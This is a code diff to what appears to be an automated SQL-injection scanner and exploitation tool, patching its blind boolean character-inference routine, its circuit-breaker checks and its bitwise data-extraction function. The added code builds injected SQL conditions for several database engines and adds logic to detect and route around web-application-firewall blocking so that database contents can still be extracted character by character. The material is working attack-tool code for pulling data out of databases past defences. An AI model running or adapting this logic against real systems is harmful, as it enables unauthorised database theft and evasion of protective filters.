@@ -63618,6 +63618,10 @@ class Scanner:
                 #      oracle is genuinely unresponsive \u2192 return None (oracle dead).
                 _fe_ambiguous = []   # candidates that returned None (potentially True)
                 _fe_none_streak = 0  # consecutive None counter (oracle-dead detection)
+                # RC8-FIX: track values that definitively returned False — these are
+                # WAF-safe (WAF passed the request) and SQL-False (correct DB result).
+                # Used below to choose a reliable complement for the WAF-uniform check.
+                _fe_seen_false = []  # values with confirmed False (WAF-safe, SQL-False)
                 # BUG-FALLBACK-EQ-SLEEP-PERF FIX (CRITICAL):
                 # _delay is the SQL sleep duration (e.g. 10s for pg_sleep(10)) \u2014 it is
                 # the TIME the server spends sleeping, not a network latency measure.
@@ -63656,34 +63660,51 @@ class Scanner:
                         # WAF-blocked 403 matches _bool_true_status=403. This produces
                         # 'a' for every position regardless of actual DB content.
                         #
-                        # Fix: before returning a True match, send one complement probe
-                        # (the next candidate in _order, or a fallback value that is
-                        # guaranteed to be SQL-False when _val is the real answer).
-                        # If the complement ALSO returns True, the oracle is WAF-uniform
-                        # and we must abort with None (not return garbage).
+                        # Fix: before returning a True match, send one complement probe.
+                        # When _val IS the real character, any different ordinal returns
+                        # False. When WAF-uniform, both return True (WAF blocks all).
                         #
-                        # Complement probe: test the value immediately following _val in
-                        # the frequency list. When _val IS the real character, the complement
-                        # (a different character value) should return False. When WAF-uniform,
-                        # both return True (WAF blocks all, not SQL result).
-                        try:
-                            _val_idx = _order.index(_val)
-                            _complement_val = _order[(_val_idx + 1) % len(_order)]
-                        except (ValueError, IndexError):
-                            _complement_val = (_val + 1) if _val < 127 else 97
+                        # RC8-FIX (CRITICAL): The original complement used the NEXT value
+                        # in _order (e.g., ordinal 99 when testing 98='b'). If the WAF
+                        # selectively blocks ordinals >= 99 (passing only 97/98), ordinal
+                        # 99 returns True due to WAF blocking \u2014 not because it is SQL-True.
+                        # This creates a false WAF-uniform detection: even when 'b' is the
+                        # real answer, the complement (99) also returns True (WAF-blocked),
+                        # causing the function to incorrectly return None instead of 'b'.
+                        #
+                        # Fix: prefer a complement value from _fe_seen_false \u2014 these have
+                        # already returned False, proving the WAF passed them (WAF-safe).
+                        # A WAF-safe complement returning True \u2192 genuine WAF-uniform.
+                        # A WAF-safe complement returning False \u2192 _val is the real answer.
+                        # If _fe_seen_false is empty (True at first probe with no prior
+                        # False), fall back to a semantically-safe zero value (ordinal=0:
+                        # NUL character, never a real match in printable strings, and WAF
+                        # rules rarely target `=0` equality conditions).
+                        if _fe_seen_false:
+                            # Use last confirmed WAF-safe False value as complement
+                            _complement_val = _fe_seen_false[-1]
+                        else:
+                            # No WAF-safe values yet \u2014 use ordinal 0 (always SQL-False
+                            # for printable chars and unlikely to be WAF-blocked)
+                            _complement_val = 0
                         _comp_cond = f"({_ae})={_complement_val}"
                         _comp_r = await _eval(_comp_cond)
                         if _comp_r is True:
-                            # Both the match AND the complement return True \u2014 oracle is
-                            # WAF-uniform for equality probes. Abort rather than return 'a'.
+                            # Complement from _fe_seen_false (WAF-safe) also True \u2192
+                            # WAF now uniformly blocks even previously-safe ordinals \u2192
+                            # genuine WAF-uniform state. Abort.
+                            # (If complement was ordinal 0 fallback and also True \u2192
+                            # WAF blocks everything including =0 \u2192 also WAF-uniform.)
                             LOG.warning(
                                 "[Inference] pos=%d equality: match val=%d returned True "
-                                "AND complement val=%d ALSO True \u2014 WAF-uniform blocking "
-                                "detected for equality probes; aborting scan (would return "
-                                "garbage otherwise).", p, _val, _complement_val)
+                                "AND WAF-safe complement val=%d ALSO True \u2014 WAF-uniform "
+                                "blocking confirmed for equality probes; aborting scan.",
+                                p, _val, _complement_val)
                             return None
                         LOG.info("[Inference] pos=%d equality \u2192 %r (val=%d)", p, chr(_val), _val)
                         return chr(_val)
+                    # RC8-FIX: record this value as WAF-safe, SQL-False for complement reuse
+                    _fe_seen_false.append(_val)
                     await asyncio.sleep(max(0.05, _fe_rtt_s * 0.3))  # BUG-FALLBACK-EQ-SLEEP-PERF FIX: was _delay * 0.3
                 # --- Post-scan ambiguity resolution ---
                 if len(_fe_ambiguous) == 1:
@@ -123865,8 +123886,8 @@ class TechniqueCascadeEngine:
                             await _gate_r.record(0, 0, error=True)
                         except Exception:
                             pass
-                        if _gate_r.killed:  # circuit_open: let acquire() handle recovery
-                            return None  # circuit open — stop entire technique
+                        if _gate_r.killed or getattr(_gate_r, '_circuit_open', False):  # RC6-FIX: also stop when circuit open (not just killed)
+                            return None  # gate killed or circuit open — stop entire technique
                     LOG.debug(f"  Cascade probe error [{dbms}:{tech}]: {_probe_e}")
             # BUG-V192-001 FIX (Sub-bug B+C): _t22_advance_dbms is now initialised
             # OUTSIDE the template loop. When the payload loop breaks with the flag
@@ -138838,7 +138859,7 @@ class ScannerV14(ScannerV13):
                             if _injection_confirmed.is_set():
                                 return []
                             # Check gate before spawning method tasks
-                            if _gate.killed:  # circuit_open: acquire() handles recovery
+                            if _gate.killed or getattr(_gate, '_circuit_open', False):  # RC6-FIX: stop on kill OR circuit open
                                 return []
 
                             async def _test_method(_hm):
@@ -138854,7 +138875,7 @@ class ScannerV14(ScannerV13):
                                 if _SCAN_STOPPED[0]:
                                     return []
                                 # Gate check: don't start if circuit open
-                                if _gate.killed:  # circuit_open: handled by acquire()
+                                if _gate.killed or getattr(_gate, '_circuit_open', False):  # RC6-FIX: stop on kill OR circuit open
                                     return []
                                 try:
                                     _hm_data = ep_data if _hm in ("POST","PUT","PATCH") else None
@@ -168445,6 +168466,50 @@ async def _bitwise_extract_with_oracle(eval_fn, query: str, dbms: str,
     except Exception as _char_sanity_exc:
         LOG.debug("[Novel] %s: char oracle sanity check error (non-fatal): %s",
                   label, _char_sanity_exc)
+    await asyncio.sleep(delay * 0.3)
+
+    # RC5-FIX: Selective-mask sanity check (&8=1, always SQL-false).
+    # x&8 ∈ {0,8}, so x&8=1 is impossible for any integer x; correct
+    # oracle always returns False. If WAF selectively blocks SQL patterns
+    # whose mask value contains the hex digit '8' (e.g. Imperva content-
+    # aware rules for bitmask data-exfil patterns), it returns True.
+    # Affected masks: 8(bit3), 2048(bit11), 524288(bit19) → all forced
+    # True → char_val += 8+2048+524288 = 526344 = chr(0x80808) for every
+    # character position → entire extraction returns garbage Unicode.
+    # Detection: probe ascii_fn&8=1 at a fixed position (pos=1).
+    # True  → WAF selectively blocks hex-8 mask patterns → abort.
+    # None  → ambiguous (WAF challenge body), treat as blocked → abort.
+    # False → selective-mask blocking not present → extraction safe.
+    try:
+        _sel_mask_fn = ascii_tmpl.format(q=query, p=1)
+        if dbms == "Oracle":
+            _sel_mask_cond = f"BITAND({_sel_mask_fn},8)=1"
+        elif dbms == "Firebird":
+            _sel_mask_cond = f"BIN_AND({_sel_mask_fn},8)=1"
+        elif dbms == "ClickHouse":
+            _sel_mask_cond = f"bitAnd({_sel_mask_fn},8)=1"
+        else:
+            _sel_mask_cond = f"{_sel_mask_fn}&8=1"
+        _sel_mask_r = await eval_fn(_sel_mask_cond)
+        if _sel_mask_r is True:
+            LOG.warning(
+                "[Novel] %s: selective-mask sanity FAILED (char &8=1 → True). "
+                "WAF selectively blocks bitmask probes containing the hex digit '8' "
+                "in the mask value (e.g. masks 8, 2048, 524288). Bits 3, 11, 19 "
+                "would be forced True → char_val=526344=chr(0x80808) for every "
+                "position. Aborting to prevent garbled extraction.", label)
+            print(f"[Novel] {label}: selective-mask WAF blocking detected (&8=1→True) — "
+                  "aborting bitwise extraction (would produce 0x80808 garbage)", flush=True)
+            return ""
+        elif _sel_mask_r is None:
+            LOG.warning(
+                "[Novel] %s: selective-mask sanity ambiguous (char &8=1 → None). "
+                "WAF may selectively block hex-8 mask probes — aborting to prevent "
+                "garbled extraction.", label)
+            return ""
+    except Exception as _sel_mask_exc:
+        LOG.debug("[Novel] %s: selective-mask sanity error (non-fatal): %s",
+                  label, _sel_mask_exc)
     await asyncio.sleep(delay * 0.3)
 
     # Extract chars
